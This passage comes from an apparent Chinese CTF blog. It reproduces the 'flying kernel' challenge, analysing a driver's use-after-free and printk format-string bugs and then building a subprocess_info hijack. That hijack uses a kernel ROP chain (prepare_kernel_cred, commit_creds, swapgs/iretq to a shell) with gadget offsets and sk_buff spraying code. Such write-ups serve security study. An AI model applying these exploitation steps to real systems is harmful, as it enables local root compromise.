class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">freeSkBuff</span><span class="params">(<span class="keyword">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里调用多次调用 <code>write</code> 和 <code>read</code> 是为了提高 <code>sk_buff</code> 命中 UAF 的概率</p>
<ul>
<li>PS：后面泄露 kernel_base 的时候一定要 read 所有的 <code>sk_buff</code>（<code>sk_buff</code> 读取后释放），不然之后的 <code>spraySkBuff</code> 会因为 <code>sk_buff</code> 存在而 write 失败，从而导致程序卡住</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/22/subprocess_info%20attack+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/22/subprocess_info%20attack+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="post-title-link" itemprop="url">subprocess_info attack+条件竞争</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-22 13:22:28 / Modified: 13:25:39" itemprop="dateCreated datePublished" datetime="2022-06-22T13:22:28+08:00">2022-06-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>flying kernel 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  files cpio -idmv &lt; rootfs.img</span><br><span class="line">➜  files ./extract-vmlinux ./bzImage &gt; vmlinux</span><br><span class="line">➜  files time ropper --file ./vmlinux --nocolor &gt; g1</span><br></pre></td></tr></table></figure>
<ul>
<li>提取 gadget</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  files cat boot.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.img \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append &quot;root=/dev/ram console=ttyS0 oops=panic panic=1 nosmap&quot; \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<ul>
<li>开了 smep（防止 <code>ret2usr</code> 攻击）和 kaslr（内核地址随机化）</li>
<li>用了2个核心，2个线程（限制线程数量，可能有条件竞争）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs cat init                           </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"></span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">insmod /flying.ko</span><br><span class="line">chmod 666 /dev/seven</span><br><span class="line">chmod 740 /flag</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict # 普通用户都无法读取内核符号地址</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict # 限制dmesg</span><br><span class="line">chmod 400 /proc/kallsyms # 限制linux内核符号表</span><br><span class="line"></span><br><span class="line">poweroff -d 240 -f &amp; # 自动关机,需要删除</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /tmp</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<ul>
<li>不允许普通用户使用 <code>dmesg</code> 命令</li>
<li>普通用户都无法读取内核符号地址</li>
<li>/proc/kallsyms 中，其它用户（Other Users）没有权限，不能 cat</li>
<li>把“自动关机”删除，方便调试</li>
<li>加载了一个 <code>flying.ko</code> 的驱动文件，先对其进行逆向分析</li>
</ul>
<p>先看看 ioctl 中注册了什么函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">seven_ioctl</span><span class="params">(__int64 fd, __int64 command, __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( (_DWORD)command )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6666</span>: <span class="comment">// delete</span></span><br><span class="line">      <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">      &#123;</span><br><span class="line">        kfree(sctf_buf, command, size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(<span class="string">&quot;What are you doing?&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x7777</span>: <span class="comment">// show</span></span><br><span class="line">      <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">        printk(sctf_buf);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5555</span>: <span class="comment">// add</span></span><br><span class="line">      <span class="keyword">if</span> ( size == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sctf_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">7</span>], <span class="number">0xCC0</span>LL, <span class="number">0x80</span>LL);</span><br><span class="line">        printk(<span class="string">&quot;Add Success!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(<span class="string">&quot;It&#x27;s not that simple\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>0x6666：释放 sctf_buf</li>
<li>0x7777：打印 sctf_buf</li>
<li>0x5555：申请 sctf_buf（大小限制为 0x80）</li>
</ul>
<p>PS：kmem_cache_alloc_trace 是 slab 算法中的函数，kmalloc_caches（缓存描述符）是相当重要的结构体，包含了一些缓存的管理数据，和指向实际缓存空间的指针</p>
<p><img src="/2022/06/22/subprocess_info%20attack+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/1653927280497.png" alt="1653927280497"></p>
<p>其他函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">seven_write</span><span class="params">(__int64 a1, __int64 buf, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_28D);</span><br><span class="line">      copy_from_user(sctf_buf + <span class="number">0x80</span> - size, buf, size);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;What are you doing?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>sctf_buf 中有 0x80 的 heap 空间</li>
<li>seven_write 会保证该空间的最后一个字节一定有数据</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-smp cores=2,threads=2 </span><br></pre></td></tr></table></figure>
<ul>
<li>限制线程数量，可能有条件竞争</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x6666</span>:</span><br><span class="line">  <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(sctf_buf, command, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>kfree 没有置空 sctf_buf 指针，UAF</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x7777</span>:</span><br><span class="line">  <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">    printk(sctf_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>printk 在内核源码中用来记录日志信息的函数，只能在内核源码范围内使用，用法和 printf 非常相似，所以存在格式化漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我们先进行调试：</p>
<p>对于内核中的各个符号来说，我们也可以通过以下命令来查看一些符号在内存中的加载地址： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep &lt;symbol_name&gt; /proc/kallsyms # symbol_name == 驱动的名称</span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br><span class="line">grep ko_test_init  /proc/kallsyms</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># grep seven /proc/kallsyms</span></span><br><span class="line">ffffffffc02d4000 t seven_close	[flying]</span><br><span class="line">ffffffffc02d4010 t seven_open	[flying]</span><br><span class="line">ffffffffc02d4020 t seven_ioctl	[flying]</span><br><span class="line">ffffffffc02d40c0 t seven_write	[flying]</span><br><span class="line">ffffffffc02d4121 t seven_exit	[flying]</span><br></pre></td></tr></table></figure>
<ul>
<li>同时，调试内核时，为了加载 vmlinux 符号表，必须额外指定 <code>-append &quot;nokaslr&quot;</code> 以关闭 kernel ASLR，这样符号表才能正确的对应至内存中的指定位置，否则将无法给目标函数下断点</li>
</ul>
<p>还可以使用以下指令来获取符号表：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># lsmod</span></span><br><span class="line">flying <span class="number">16384</span> <span class="number">0</span> - Live <span class="number">0xffffffffc02d4000</span> (O)</span><br></pre></td></tr></table></figure>
<p>但是 vmlinux 的符号表似乎被删除了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file vmlinux <span class="number">0xffffffffc02d4000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;vmlinux&quot;</span> at</span><br><span class="line">	.text_addr = <span class="number">0xffffffffc02d4000</span></span><br><span class="line">Reading symbols from vmlinux...</span><br><span class="line">(No debugging symbols found in vmlinux)</span><br><span class="line">warning: newly-added symbol file <span class="string">&quot;vmlinux&quot;</span> does <span class="keyword">not</span> provide any symbols</span><br></pre></td></tr></table></figure>
<ul>
<li>没办法，没有符号表调试不了，一秒一步的 kernel 太难受了</li>
</ul>
<p>先利用格式化漏洞来泄露数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(fd);</span><br><span class="line">write(fd,<span class="string">&quot;%llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx &quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">show(fd);</span><br><span class="line">show(fd);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./<span class="built_in">exp</span></span><br><span class="line">[    <span class="number">5.272409</span>] open()</span><br><span class="line">fd: <span class="number">3</span></span><br><span class="line">[    <span class="number">5.277169</span>] Add Success!</span><br><span class="line">[    <span class="number">5.277557</span>] write()</span><br><span class="line">[    <span class="number">5.277849</span>] <span class="number">7777</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> ffffffffa65f3ecd <span class="number">0</span> ffffabb380247f58 <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>slub 分配器在 <code>kmem_cache_cpu</code> 中使用 <code>freelist</code> 管理空闲对象，类似于 glibc 中的 fastbin </li>
</ul>
<p>由于开启了 freelist 随机化和 Harden_freelist 保护，以上数据并不是正确的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">get_freepointer_safe</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freepointer_addr;</span><br><span class="line">	<span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!debug_pagealloc_enabled()) <span class="comment">/* 如果没开启CONFIG_DEBUG_PAGEALLOC,那么就会进入get_freepointer() */</span></span><br><span class="line">		<span class="keyword">return</span> get_freepointer(s, object);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 否则就会进行加密 */</span></span><br><span class="line">	freepointer_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line">	probe_kernel_read(&amp;p, (<span class="keyword">void</span> **)freepointer_addr, <span class="keyword">sizeof</span>(p));</span><br><span class="line">	<span class="keyword">return</span> freelist_ptr(s, p, freepointer_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>加固指针 = 空闲指针 ^ 空闲指针地址 ^ 随机数R，只要知道这些值就可以绕过 Harden_freelist </li>
<li>关于 freelist 的保护可以看这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h2-13">slub堆溢出的利用 - 安全客</a> </li>
</ul>
<p>这里出现了两种思路：</p>
<ul>
<li>利用条件竞争劫持 subprocess_info</li>
<li>泄露 random 劫持 freelist 打 modprobe_path </li>
</ul>
<p><strong>利用条件竞争劫持 subprocess_info</strong></p>
<p>在使用 <code>socket(22, AF_INET, 0)</code> 时会分配结构体 <code>subprocess_info</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>此对象在分配时最终会调用 cleanup 函数，如果我们能在分配过程中把 cleanup 指针劫持为我们的 ROP 链</li>
<li>为了 <code>subprocess_info</code> 不被破坏，我们只能覆盖 cleanup 指针</li>
</ul>
<p>模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *info = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)arg;</span><br><span class="line">info[<span class="number">0</span>] = (<span class="keyword">u_int64_t</span>)xchg_eax_esp; <span class="comment">// cleanup将会被劫持为这里(这个gadget可以控制栈,方便进行ROP)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)xchg_eax_esp &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack: %p\n&quot;</span>, (<span class="keyword">char</span> *)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>((fake_stack = mmap((<span class="keyword">char</span>*)((hijacked_stack_addr &amp; (~<span class="number">0xfff</span>))),<span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>)) == MAP_FAILED)</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line">fake_stack[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">u_int64_t</span>* hijacked_stack_ptr = (<span class="keyword">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">hijacked_stack_ptr[index++] = pop_rdi;</span><br><span class="line">hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">hijacked_stack_ptr[index++] = prepare_kernel_cred;</span><br><span class="line">hijacked_stack_ptr[index++] = mov_rdi_rax_je_pop_pop_ret;</span><br><span class="line">hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">hijacked_stack_ptr[index++] = <span class="number">0</span>;</span><br><span class="line">hijacked_stack_ptr[index++] = commit_creds;</span><br><span class="line">hijacked_stack_ptr[index++] = swapgs;</span><br><span class="line">hijacked_stack_ptr[index++] = iretq;</span><br><span class="line">hijacked_stack_ptr[index++] = (<span class="keyword">u_int64_t</span>)getshell;</span><br><span class="line">hijacked_stack_ptr[index++] = user_cs;</span><br><span class="line">hijacked_stack_ptr[index++] = user_rflags;</span><br><span class="line">hijacked_stack_ptr[index++] = user_rsp;</span><br><span class="line">hijacked_stack_ptr[index++] = user_ss;</span><br></pre></td></tr></table></figure>
<ul>
<li>这些 gadget 都可以通过 <code>ropper</code> 来找</li>
<li>commit_creds，prepare_kernel_cred 可以通过 <code>grep &lt;symbol_name&gt; /proc/kallsyms</code> 来找（记得开 root，关闭 kernel ASLR）</li>
<li>而 user_cs 这些寄存器的值，可以通过 <code>save_status</code> 来获取</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">xchg_eax_esp = <span class="number">0xffffffff81011cb0</span> + raw_kernel; <span class="comment">// xchg eax, esp; ret;</span></span><br><span class="line">pop_rdi = <span class="number">0xffffffff810016e9</span>+ raw_kernel; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">mov_cr4_rdi = <span class="number">0xFFFFFFFF810460F2</span>+ raw_kernel; <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">prepare_kernel_cred = <span class="number">0xFFFFFFFF8108C780</span>+ raw_kernel;</span><br><span class="line">commit_creds = <span class="number">0xFFFFFFFF8108C360</span>+ raw_kernel;</span><br><span class="line">mov_rdi_rsi = <span class="number">0xffffffff81075f00</span> + raw_kernel; <span class="comment">// mov qword ptr [rdi], rsi; ret;</span></span><br><span class="line">pop_rsi = <span class="number">0xffffffff811cad0d</span> + raw_kernel; <span class="comment">// pop rsi;ret</span></span><br><span class="line">hook_prctl = <span class="number">0xFFFFFFFF824C0D80</span> + raw_kernel; <span class="comment">/* no work */</span></span><br><span class="line">poweroff_work_func = <span class="number">0xFFFFFFFF810C9CE0</span>+ raw_kernel; <span class="comment">/* no work */</span></span><br><span class="line">power_cmd = <span class="number">0xFFFFFFFF82663440</span> + raw_kernel; <span class="comment">/* no work */</span></span><br><span class="line">mov_rdi_rax_je_pop_pop_ret = <span class="number">0xffffffff819b5764</span> + raw_kernel; <span class="comment">// mov rdi</span></span><br><span class="line">swapgs = <span class="number">0xffffffff81c00f58</span> + raw_kernel; <span class="comment">// swagps;ret</span></span><br><span class="line">iretq = <span class="number">0xffffffff81024f92</span> + raw_kernel; <span class="comment">// iretq; ret;</span></span><br><span class="line">test_rbx_jne_pop_pop_ret = <span class="number">0xffffffff811d9291</span> + raw_kernel; <span class="comment">/* no work */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] xchg addr :b *0x%16llx\n&quot;</span>, xchg_eax_esp);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">u_int64_t</span> user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__ (<span class="string">&quot;.intel_syntax noprefix\n&quot;</span>);</span><br><span class="line">    <span class="function">__asm__ <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov user_cs, cs;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_ss, ss;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_gs, gs;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_ds, ds;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_es, es;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         mov user_rsp, rsp;\</span></span></span></span><br><span class="line"><span class="string"><span class="params"><span class="function">         